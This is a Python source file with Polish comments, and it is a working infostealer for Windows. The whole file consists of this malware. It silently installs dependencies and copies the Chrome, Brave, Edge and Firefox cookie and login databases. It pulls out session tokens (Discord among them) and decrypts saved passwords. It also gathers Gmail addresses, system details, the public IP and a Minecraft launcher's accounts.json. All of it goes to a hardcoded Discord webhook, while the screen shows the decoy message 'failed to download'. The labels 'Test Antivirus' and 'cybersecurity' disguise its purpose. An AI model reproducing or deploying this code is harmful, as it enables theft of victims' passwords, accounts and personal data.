import subprocess
import sys
import requests
import platform
import getpass
import os
import sqlite3
import glob
import json
import re
from datetime import datetime

# Cicha instalacja wymaganych bibliotek
def install_requirements():
    required = ['requests', 'discord-webhook', 'pywin32']
    for package in required:
        try:
            __import__(package.replace('pywin32', 'win32crypt').replace('discord-webhook', 'discord_webhook'))
        except ImportError:
            subprocess.run([sys.executable, "-m", "pip", "install", package, "--quiet"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Uruchom instalację bibliotek
install_requirements()

# Import bibliotek po instalacji
try:
    from discord_webhook import DiscordWebhook, DiscordEmbed
except ImportError:
    print("failed to download")
    sys.exit(0)

try:
    import win32crypt
    win32_available = True
except ImportError:
    win32_available = False

# Konfiguracja webhooka Discord (podaj swój URL)
WEBHOOK_URL = "https://discord.com/api/webhooks/1366400489696268329/wwWvSVHcESqZWoi9Io5CU05fwrf3_4g7rEwDYsNMg6lL344v3QPNZjg4p7QwJlkyUhJu"  # Zastąp swoim webhookiem

# Funkcja do pobierania publicznego adresu IP
def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        response.raise_for_status()
        return response.json().get("ip", "Brak IP")
    except Exception:
        return "Brak IP"

# Funkcja do pobierania tokenów z ciasteczek przeglądarek
def get_tokens_from_cookies():
    tokens = []
    browser_paths = [
        (r"\AppData\Local\Google\Chrome\User Data\Default\Cookies", "Chrome"),
        (r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Cookies", "Brave"),
        (r"\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite", "Firefox"),
        (r"\AppData\Local\Microsoft\Edge\User Data\Default\Cookies", "Edge")
    ]
    platforms = ["discord", "facebook", "twitter", "instagram", "github", "reddit", "token", "auth", "session"]

    for path, browser in browser_paths:
        try:
            full_path = os.path.expanduser("~") + path
            for db_file in glob.glob(full_path):
                temp_dir = os.getenv("TEMP", r"C:\Temp")
                os.makedirs(temp_dir, exist_ok=True)
                temp_path = os.path.join(temp_dir, f"Cookies_{browser}_{os.urandom(4).hex()}.sqlite")
                os.system(f'copy "{db_file}" "{temp_path}" >nul 2>nul')
                if os.path.exists(temp_path):
                    try:
                        conn = sqlite3.connect(f"file:{temp_path}?mode=ro", uri=True)
                        conn.text_factory = bytes
                        cursor = conn.cursor()
                        cursor.execute("SELECT host_key, name, value FROM cookies WHERE name LIKE '%token%' OR name LIKE '%auth%' OR name LIKE '%session%'")
                        for row in cursor.fetchall():
                            host_key = row[0].decode('utf-8', errors='ignore') if isinstance(row[0], bytes) else row[0]
                            name = row[1].decode('utf-8', errors='ignore') if isinstance(row[1], bytes) else row[1]
                            value = row[2].decode('utf-8', errors='ignore') if isinstance(row[2], bytes) else row[2]
                            for platform in platforms:
                                if platform in host_key.lower() or platform in name.lower():
                                    tokens.append(f"{browser} ({platform}): {value}")
                        conn.close()
                    finally:
                        if os.path.exists(temp_path):
                            os.remove(temp_path)
        except Exception:
            pass
    
    return tokens

# Funkcja do pobierania tokenów z Local Storage
def get_tokens_from_local_storage():
    tokens = []
    browser_paths = [
        (r"\AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb", "Chrome"),
        (r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb", "Brave"),
        (r"\AppData\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb", "Edge")
    ]
    platforms = ["discord", "facebook", "twitter", "instagram", "github", "reddit"]

    for path, browser in browser_paths:
        try:
            full_path = os.path.expanduser("~") + path
            for ldb_file in glob.glob(os.path.join(full_path, "*.ldb")):
                try:
                    with open(ldb_file, "rb") as f:
                        content = f.read().decode('utf-8', errors='ignore')
                        for platform in platforms:
                            if platform in content.lower():
                                token_pattern = r'[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}'  # Wzorzec Discord
                                tokens_found = re.findall(token_pattern, content)
                                for token in tokens_found:
                                    tokens.append(f"{browser} ({platform} Local Storage): {token}")
                                json_objects = re.findall(r'\{.*?"(?:token|auth)":"(.*?)".*?\}', content)
                                for json_token in json_objects:
                                    tokens.append(f"{browser} ({platform} JSON): {json_token}")
                except Exception:
                    pass
        except Exception:
            pass
    
    return tokens

# Funkcja do pobierania wszystkich tokenów
def get_tokens():
    tokens = get_tokens_from_cookies() + get_tokens_from_local_storage()
    return tokens if tokens else ["Brak tokenów"]

# Funkcja do pobierania haseł z przeglądarek
def get_passwords():
    passwords = []
    browser_paths = [
        (r"\AppData\Local\Google\Chrome\User Data\Default\Login Data", "Chrome"),
        (r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data", "Brave"),
        (r"\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json", "Firefox"),
        (r"\AppData\Local\Microsoft\Edge\User Data\Default\Login Data", "Edge")
    ]

    for path, browser in browser_paths:
        try:
            full_path = os.path.expanduser("~") + path
            if "Firefox" in browser:
                for logins_file in glob.glob(full_path):
                    try:
                        with open(logins_file, "r") as f:
                            logins = json.load(f).get("logins", [])
                            for login in logins:
                                password = login.get('password', '')
                                if password:
                                    passwords.append(
                                        f"{browser} - URL: {login.get('hostname', 'N/A')}, "
                                        f"User: {login.get('username', 'N/A')}, "
                                        f"Hasło: {password}"
                                    )
                    except Exception:
                        pass
            else:
                for db_file in glob.glob(full_path):
                    temp_dir = os.getenv("TEMP", r"C:\Temp")
                    os.makedirs(temp_dir, exist_ok=True)
                    temp_path = os.path.join(temp_dir, f"LoginData_{browser}_{os.urandom(4).hex()}.sqlite")
                    os.system(f'copy "{db_file}" "{temp_path}" >nul 2>nul')
                    if os.path.exists(temp_path):
                        try:
                            conn = sqlite3.connect(f"file:{temp_path}?mode=ro", uri=True)
                            cursor = conn.cursor()
                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                            for row in cursor.fetchall():
                                try:
                                    if win32_available and row[2]:
                                        password = win32crypt.CryptUnprotectData(row[2])[1].decode('utf-8')
                                        passwords.append(
                                            f"{browser} - URL: {row[0]}, User: {row[1]}, Hasło: {password}"
                                        )
                                except Exception:
                                    pass
                            conn.close()
                        finally:
                            if os.path.exists(temp_path):
                                os.remove(temp_path)
        except Exception:
            pass
    
    return passwords if passwords else ["Brak haseł"]

# Funkcja do pobierania adresów e-mail (Gmail)
def get_emails():
    emails = []
    browser_paths = [
        (r"\AppData\Local\Google\Chrome\User Data\Default\Login Data", "Chrome"),
        (r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data", "Brave"),
        (r"\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json", "Firefox"),
        (r"\AppData\Local\Microsoft\Edge\User Data\Default\Login Data", "Edge")
    ]
    preference_paths = [
        (r"\AppData\Local\Google\Chrome\User Data\Default\Preferences", "Chrome"),
        (r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Preferences", "Brave"),
        (r"\AppData\Local\Microsoft\Edge\User Data\Default\Preferences", "Edge"),
        (r"\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\prefs.js", "Firefox")
    ]

    # Pobieranie z Login Data
    for path, browser in browser_paths:
        try:
            full_path = os.path.expanduser("~") + path
            if "Firefox" in browser:
                for logins_file in glob.glob(full_path):
                    try:
                        with open(logins_file, "r") as f:
                            logins = json.load(f).get("logins", [])
                            for login in logins:
                                username = login.get('username', '')
                                if username and ('gmail.com' in login.get('hostname', '').lower() or 'google.com' in login.get('hostname', '').lower()):
                                    emails.append(f"{browser} (Login): {username}")
                    except Exception:
                        pass
            else:
                for db_file in glob.glob(full_path):
                    temp_dir = os.getenv("TEMP", r"C:\Temp")
                    os.makedirs(temp_dir, exist_ok=True)
                    temp_path = os.path.join(temp_dir, f"LoginData_{browser}_{os.urandom(4).hex()}.sqlite")
                    os.system(f'copy "{db_file}" "{temp_path}" >nul 2>nul')
                    if os.path.exists(temp_path):
                        try:
                            conn = sqlite3.connect(f"file:{temp_path}?mode=ro", uri=True)
                            cursor = conn.cursor()
                            cursor.execute("SELECT origin_url, username_value FROM logins")
                            for row in cursor.fetchall():
                                if row[1] and ('gmail.com' in row[0].lower() or 'google.com' in row[0].lower()):
                                    emails.append(f"{browser} (Login): {row[1]}")
                            conn.close()
                        finally:
                            if os.path.exists(temp_path):
                                os.remove(temp_path)
        except Exception:
            pass

    # Pobieranie z Preferences/prefs.js
    for path, browser in preference_paths:
        try:
            full_path = os.path.expanduser("~") + path
            for pref_file in glob.glob(full_path):
                try:
                    with open(pref_file, "r", encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        if "Firefox" in browser:
                            email_pattern = r'user_pref\(".*email.*",\s*"(.+?@gmail\.com)"\)'
                            found_emails = re.findall(email_pattern, content)
                            for email in found_emails:
                                emails.append(f"{browser} (Prefs): {email}")
                        else:
                            data = json.loads(content)
                            account_info = data.get('account_info', [])
                            for account in account_info:
                                email = account.get('email', '')
                                if email and 'gmail.com' in email.lower():
                                    emails.append(f"{browser} (Account): {email}")
                except Exception:
                    pass
        except Exception:
            pass
    
    return list(set(emails)) if emails else ["Brak emaili Gmail"]

# Funkcja do zapisywania tokenów do pliku tymczasowego
def save_tokens_to_file(tokens):
    temp_dir = os.getenv("TEMP", r"C:\Temp")
    os.makedirs(temp_dir, exist_ok=True)
    temp_file = os.path.join(temp_dir, f"tokens_{os.urandom(4).hex()}.txt")
    try:
        with open(temp_file, "w", encoding="utf-8") as f:
            f.write("\n".join([t for t in tokens if t != "Brak tokenów"]))
        return temp_file
    except Exception:
        return None

# Funkcja do wysyłania danych na webhook
def send_to_webhook(public_ip, system_info, emails, passwords, tokens, appdata_files, accounts_file):
    try:
        if not WEBHOOK_URL.startswith("https://discord.com/api/webhooks/"):
            return

        embed = DiscordEmbed(
            title="🛡️ Dane Testowe (Cyberbezpieczeństwo)",
            color=0x7289DA,
            timestamp=datetime.now().isoformat()
        )
        embed.add_embed_field(name="🌐 Publiczny IP", value=public_ip or "Brak", inline=False)
        embed.add_embed_field(
            name="💻 Informacje o systemie",
            value="\n".join([
                f"System: {system_info.get('System', 'N/A')}",
                f"Wersja: {system_info.get('Wersja', 'N/A')}",
                f"Użytkownik: {system_info.get('Nazwa użytkownika', 'N/A')}",
                f"Komputer: {system_info.get('Nazwa komputera', 'N/A')}",
                f"Procesor: {system_info.get('Procesor', 'N/A')}",
                f"RAM: {system_info.get('Pamięć RAM (MB)', 'N/A')}"
            ]),
            inline=False
        )
        embed.add_embed_field(
            name="📧 Adresy e-mail (Gmail)",
            value="\n".join([f"- {e}" for e in emails[:5]]),
            inline=False
        )
        embed.add_embed_field(
            name="🔒 Hasła z przeglądarek",
            value="\n".join([f"- {p}" for p in passwords[:5]]),
            inline=False
        )
        embed.add_embed_field(
            name="📁 Pliki w %AppData% (pierwsze 10)",
            value="\n".join([f"- {f}" for f in appdata_files]),
            inline=False
        )
        embed.set_footer(text="Wygenerowano przez Test Antivirus")

        webhook = DiscordWebhook(url=WEBHOOK_URL, embeds=[embed])

        # Zawsze wysyłaj tokeny jako plik
        token_file = save_tokens_to_file(tokens)
        if token_file:
            with open(token_file, "rb") as f:
                webhook.add_file(file=f.read(), filename="tokens.txt")

        # Dodaj accounts.json
        if accounts_file and os.path.exists(accounts_file):
            with open(accounts_file, "rb") as f:
                webhook.add_file(file=f.read(), filename="accounts.json")

        webhook.execute()

        # Usuń plik tymczasowy tokenów
        if token_file and os.path.exists(token_file):
            os.remove(token_file)

    except Exception:
        pass

# Funkcja do zbierania informacji o systemie
def get_system_info():
    try:
        return {
            "System": platform.system(),
            "Wersja": platform.version(),
            "Nazwa użytkownika": getpass.getuser(),
            "Nazwa komputera": platform.node(),
            "Procesor": platform.processor(),
            "Pamięć RAM (MB)": "N/A",
        }
    except Exception:
        return {"System": "N/A", "Wersja": "N/A", "Nazwa użytkownika": "N/A", "Nazwa komputera": "N/A", "Procesor": "N/A", "Pamięć RAM (MB)": "N/A"}

# Funkcja do zbierania listy plików w folderze %AppData%
def get_appdata_files():
    try:
        appdata_path = os.path.expanduser("~") + r"\AppData\Roaming"
        files = glob.glob(os.path.join(appdata_path, "*"))
        return [os.path.basename(f) for f in files[:10]]
    except Exception:
        return ["Brak plików"]

# Główna funkcja programu
def main():
    try:
        public_ip = get_public_ip()
        system_info = get_system_info()
        emails = get_emails()
        passwords = get_passwords()
        tokens = get_tokens()
        appdata_files = get_appdata_files()

        accounts_file = os.path.expanduser("~") + r"\AppData\Roaming\.feather\accounts.json"

        send_to_webhook(public_ip, system_info, emails, passwords, tokens, appdata_files, accounts_file)

        print("failed to download")
    except Exception:
        print("failed to download")

if __name__ == "__main__":
    main()